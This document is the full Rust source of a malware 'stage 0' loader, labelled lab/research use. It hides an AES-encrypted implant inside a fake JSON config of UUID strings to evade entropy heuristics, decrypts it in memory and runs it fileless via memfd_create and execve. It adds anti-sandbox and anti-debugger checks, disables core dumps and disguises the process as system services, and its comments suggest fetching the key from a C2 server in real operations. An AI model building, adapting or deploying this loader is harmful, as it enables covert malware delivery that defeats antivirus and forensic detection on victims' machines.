// ERS Stage 0 Loader — Lab/Research Use Only
//
// Fills the delivery-phase detection gap:
//   1. The real implant is embedded as an AES-CBC encrypted blob
//   2. Loader decrypts in memory only
//   3. memfd_create() creates anonymous in-memory file descriptor
//   4. fexecve() runs the implant directly from memory
//   5. The decrypted ELF never touches disk
//
// Build flow:
//   1. Build the real implant:  cd ../  &&  bash build.sh
//   2. Encrypt it:              python3 encrypt_payload.py ../implant
//   3. Copy encrypted blob:     cp payload.enc src/payload.enc
//   4. Build loader:            cargo build --release
//   5. Transfer only the loader — it carries the encrypted implant inside
//
// What AV sees during transfer:
//   - A small binary with no malicious signatures
//   - An embedded blob of random-looking encrypted data
//   - No reverse shell code, no C2 strings, no network calls
//
// What happens at runtime:
//   - Decrypt blob → memfd_create → fexecve → implant runs from RAM
//   - /proc/PID/exe → "/memfd:..." (no disk path)
//   - No file to scan, no file to delete

use std::env;
use std::ffi::CString;

// ── AES-256-CBC (minimal, no external crate) ──────────────────────────

const SBOX: [u8; 256] = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
];

const INV_SBOX: [u8; 256] = [
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
];

const RCON: [u8; 10] = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

fn gmul(mut a: u8, mut b: u8) -> u8 {
    let mut p: u8 = 0;
    for _ in 0..8 {
        if b & 1 != 0 { p ^= a; }
        let hi = a & 0x80;
        a <<= 1;
        if hi != 0 { a ^= 0x1b; }
        b >>= 1;
    }
    p
}

fn key_expansion(key: &[u8; 32]) -> [[u8; 16]; 15] {
    let mut w = [0u8; 240];
    w[..32].copy_from_slice(key);

    let nk = 8;
    let nr = 14;
    for i in nk..(4 * (nr + 1)) {
        let mut temp = [w[4*(i-1)], w[4*(i-1)+1], w[4*(i-1)+2], w[4*(i-1)+3]];
        if i % nk == 0 {
            temp = [SBOX[temp[1] as usize], SBOX[temp[2] as usize],
                    SBOX[temp[3] as usize], SBOX[temp[0] as usize]];
            temp[0] ^= RCON[(i / nk) - 1];
        } else if i % nk == 4 {
            temp = [SBOX[temp[0] as usize], SBOX[temp[1] as usize],
                    SBOX[temp[2] as usize], SBOX[temp[3] as usize]];
        }
        for j in 0..4 {
            w[4*i + j] = w[4*(i - nk) + j] ^ temp[j];
        }
    }

    let mut rk = [[0u8; 16]; 15];
    for r in 0..15 {
        rk[r].copy_from_slice(&w[r*16..(r+1)*16]);
    }
    rk
}

fn aes_decrypt_block(block: &mut [u8; 16], rk: &[[u8; 16]; 15]) {
    for i in 0..16 { block[i] ^= rk[14][i]; }

    for round in (1..14).rev() {
        // inv shift rows
        let tmp = block[13]; block[13] = block[9]; block[9] = block[5]; block[5] = block[1]; block[1] = tmp;
        let tmp = block[2]; block[2] = block[10]; block[10] = tmp;
        let tmp = block[6]; block[6] = block[14]; block[14] = tmp;
        let tmp = block[3]; block[3] = block[7]; block[7] = block[11]; block[11] = block[15]; block[15] = tmp;
        // inv sub bytes
        for i in 0..16 { block[i] = INV_SBOX[block[i] as usize]; }
        // add round key
        for i in 0..16 { block[i] ^= rk[round][i]; }
        // inv mix columns
        let mut col = [0u8; 4];
        for c in 0..4 {
            let s = &block[c*4..(c+1)*4];
            col[0] = gmul(s[0],14) ^ gmul(s[1],11) ^ gmul(s[2],13) ^ gmul(s[3],9);
            col[1] = gmul(s[0],9)  ^ gmul(s[1],14) ^ gmul(s[2],11) ^ gmul(s[3],13);
            col[2] = gmul(s[0],13) ^ gmul(s[1],9)  ^ gmul(s[2],14) ^ gmul(s[3],11);
            col[3] = gmul(s[0],11) ^ gmul(s[1],13) ^ gmul(s[2],9)  ^ gmul(s[3],14);
            block[c*4..c*4+4].copy_from_slice(&col);
        }
    }

    // Final round (no mix columns)
    let tmp = block[13]; block[13] = block[9]; block[9] = block[5]; block[5] = block[1]; block[1] = tmp;
    let tmp = block[2]; block[2] = block[10]; block[10] = tmp;
    let tmp = block[6]; block[6] = block[14]; block[14] = tmp;
    let tmp = block[3]; block[3] = block[7]; block[7] = block[11]; block[11] = block[15]; block[15] = tmp;
    for i in 0..16 { block[i] = INV_SBOX[block[i] as usize]; }
    for i in 0..16 { block[i] ^= rk[0][i]; }
}

fn aes256_cbc_decrypt(data: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    let rk = key_expansion(key);
    let mut result = Vec::with_capacity(data.len());
    let mut prev_ct = *iv;

    for chunk in data.chunks(16) {
        if chunk.len() < 16 { break; }
        let mut block = [0u8; 16];
        block.copy_from_slice(chunk);
        let ct_copy = block;
        aes_decrypt_block(&mut block, &rk);
        for i in 0..16 { block[i] ^= prev_ct[i]; }
        prev_ct = ct_copy;
        result.extend_from_slice(&block);
    }

    // Remove PKCS7 padding
    if let Some(&pad_len) = result.last() {
        let pl = pad_len as usize;
        if pl > 0 && pl <= 16 && result.len() >= pl {
            if result[result.len()-pl..].iter().all(|&b| b == pad_len) {
                result.truncate(result.len() - pl);
            }
        }
    }
    result
}

// ── Secure memory ──────────────────────────────────────────────────────

fn secure_zero(buf: &mut [u8]) {
    unsafe {
        std::ptr::write_bytes(buf.as_mut_ptr(), 0, buf.len());
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

fn prevent_core_dump() {
    unsafe {
        let rlim = libc::rlimit { rlim_cur: 0, rlim_max: 0 };
        libc::setrlimit(libc::RLIMIT_CORE, &rlim);
        libc::prctl(libc::PR_SET_DUMPABLE, 0);
    }
}

// ── Encrypted payload (embedded as fake JSON config) ───────────────────
// Format: JSON with "resources" array of UUID strings encoding [IV + ciphertext]
// Entropy reduced from ~8.0 to ~3.8 bits/byte to avoid heuristic detection
// Generated by encrypt_payload.py

const PAYLOAD_CONFIG: &str = include_str!("payload.enc");

// Key derived from environment or hardcoded for lab
// In real ops: fetch key from C2, or derive from target-specific data
const PAYLOAD_KEY: [u8; 32] = [
    0x4f, 0x2b, 0x91, 0xd3, 0xa7, 0x58, 0xe1, 0x3c,
    0x7d, 0xb6, 0x0a, 0xf4, 0x29, 0x85, 0xc3, 0x6e,
    0x1a, 0xd8, 0x43, 0xf7, 0x5b, 0x90, 0x2e, 0x64,
    0xbc, 0x07, 0xe5, 0x39, 0x81, 0xca, 0x56, 0xf0,
];

// ── memfd_create (syscall 319 on x86_64) ───────────────────────────────

fn memfd_create(name: &str) -> i32 {
    let c_name = CString::new(name).unwrap();
    unsafe {
        libc::syscall(319, c_name.as_ptr(), 1u32 /* MFD_CLOEXEC */) as i32
    }
}

// ── Anti-analysis (minimal, just enough to not run in sandboxes) ───────

fn quick_sandbox_check() -> bool {
    if let Ok(uptime) = std::fs::read_to_string("/proc/uptime") {
        let secs: f64 = uptime.split_whitespace()
            .next()
            .and_then(|s| s.parse().ok())
            .unwrap_or(99999.0);
        if secs < 300.0 { return true; }
    }

    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if line.starts_with("TracerPid:") {
                let pid = line.split(':').nth(1).unwrap_or("0").trim();
                if pid != "0" { return true; }
            }
        }
    }
    false
}

// ── Process masking ────────────────────────────────────────────────────

fn mask_as_legitimate() {
    let names: [&[u8]; 4] = [
        b"/usr/libexec/gsd-power",
        b"/usr/lib/xdg-desktop-portal",
        b"/usr/libexec/gvfs-udisks2-volume-monitor",
        b"/usr/bin/dbus-monitor --session",
    ];

    let mut rng = rand::rng();
    let idx = rand::Rng::random_range(&mut rng, 0..names.len());
    let fake = CString::new(names[idx]).unwrap_or_default();

    unsafe {
        // PR_SET_NAME changes /proc/PID/comm (what ps/top show)
        libc::prctl(libc::PR_SET_NAME, fake.as_ptr());
    }
}

// ── Extract payload from fake JSON config ──────────────────────────────

fn extract_payload_from_config() -> Option<Vec<u8>> {
    // Simple JSON parse: find "resources" array, extract UUID strings
    let config = PAYLOAD_CONFIG;

    // Find the resources array
    let resources_start = config.find("\"resources\"")?;
    let arr_start = config[resources_start..].find('[')? + resources_start + 1;
    let arr_end = config[arr_start..].find(']')? + arr_start;
    let arr_content = &config[arr_start..arr_end];

    // Extract UUID strings and decode to bytes
    let mut raw = Vec::new();
    for part in arr_content.split('"') {
        let trimmed = part.trim();
        // UUID format: 8-4-4-4-12 hex chars
        if trimmed.len() == 36 && trimmed.contains('-') {
            let hex: String = trimmed.replace('-', "");
            if hex.len() == 32 {
                if let Some(bytes) = hex_decode(&hex) {
                    raw.extend_from_slice(&bytes);
                }
            }
        }
    }

    if raw.len() < 16 { return None; }

    let iv: [u8; 16] = raw[..16].try_into().ok()?;
    let ciphertext = &raw[16..];

    let mut key = PAYLOAD_KEY;
    let mut decrypted = aes256_cbc_decrypt(ciphertext, &key, &iv);
    secure_zero(&mut key);

    // Layout: [orig_size: 4 bytes LE] [random_pad: N bytes] [ELF: orig_size bytes]
    // ELF starts at: decrypted.len() - orig_size
    if decrypted.len() < 4 { return None; }
    let orig_size = u32::from_le_bytes(decrypted[..4].try_into().ok()?) as usize;

    if orig_size > decrypted.len() - 4 { secure_zero(&mut decrypted); return None; }
    let elf_start = decrypted.len() - orig_size;

    if elf_start < 4 || &decrypted[elf_start..elf_start+4] != b"\x7fELF" {
        secure_zero(&mut decrypted);
        return None;
    }

    let elf_data = decrypted[elf_start..elf_start + orig_size].to_vec();
    secure_zero(&mut decrypted);
    Some(elf_data)
}

fn hex_decode(hex: &str) -> Option<Vec<u8>> {
    let bytes: Vec<u8> = (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i+2], 16))
        .collect::<Result<Vec<u8>, _>>()
        .ok()?;
    Some(bytes)
}

// ── Main: extract → decrypt → memfd → exec ────────────────────────────

fn main() {
    let debug = env::args().any(|a| a == "--debug");

    prevent_core_dump();

    if !debug && quick_sandbox_check() {
        std::thread::sleep(std::time::Duration::from_secs(3600));
        return;
    }

    if debug { eprintln!("[*] extracting payload from config..."); }

    let mut plaintext = match extract_payload_from_config() {
        Some(data) => data,
        None => {
            if debug { eprintln!("[!] payload extraction failed"); }
            return;
        }
    };

    if plaintext.len() < 4 || &plaintext[..4] != b"\x7fELF" {
        if debug { eprintln!("[!] not a valid ELF"); }
        secure_zero(&mut plaintext);
        return;
    }

    if debug { eprintln!("[+] decrypted ELF: {} bytes", plaintext.len()); }

    let fd = memfd_create("");
    if fd < 0 {
        if debug { eprintln!("[!] memfd_create failed"); }
        secure_zero(&mut plaintext);
        return;
    }

    if debug { eprintln!("[+] memfd_create fd={}", fd); }

    unsafe {
        let mut written = 0usize;
        while written < plaintext.len() {
            let n = libc::write(
                fd,
                plaintext[written..].as_ptr() as *const libc::c_void,
                plaintext.len() - written,
            );
            if n <= 0 {
                if debug { eprintln!("[!] write to memfd failed"); }
                libc::close(fd);
                secure_zero(&mut plaintext);
                return;
            }
            written += n as usize;
        }
    }

    secure_zero(&mut plaintext);

    if debug { eprintln!("[+] ELF written to memfd, executing..."); }

    unsafe {
        let fd_path = format!("/proc/self/fd/{}", fd);
        let fd_path_c = CString::new(fd_path).unwrap();

        // Set marker so implant knows it's already in memory
        let marker = CString::new("_MFD").unwrap();
        let val = CString::new("1").unwrap();
        libc::setenv(marker.as_ptr(), val.as_ptr(), 1);

        // Forward any args (e.g. --debug, IP, port)
        let args: Vec<String> = env::args().skip(1).collect();
        let c_args: Vec<CString> = args.iter()
            .map(|a| CString::new(a.as_str()).unwrap())
            .collect();

        let mut argv: Vec<*const libc::c_char> = Vec::new();
        argv.push(fd_path_c.as_ptr());
        for a in &c_args { argv.push(a.as_ptr()); }
        argv.push(std::ptr::null());

        // Build envp from current environment (includes _MFD=1)
        let env_vars: Vec<String> = env::vars().map(|(k, v)| format!("{}={}", k, v)).collect();
        let c_envs: Vec<CString> = env_vars.iter()
            .map(|e| CString::new(e.as_str()).unwrap())
            .collect();
        let mut envp: Vec<*const libc::c_char> = c_envs.iter().map(|e| e.as_ptr()).collect();
        envp.push(std::ptr::null());

        if !debug { mask_as_legitimate(); }

        // fexecve via /proc/self/fd/N — pass full environment so _MFD=1 reaches the implant
        libc::execve(fd_path_c.as_ptr(), argv.as_ptr(), envp.as_ptr());

        if debug { eprintln!("[!] execve failed: {}", *libc::__errno_location()); }
        libc::close(fd);
    }
}
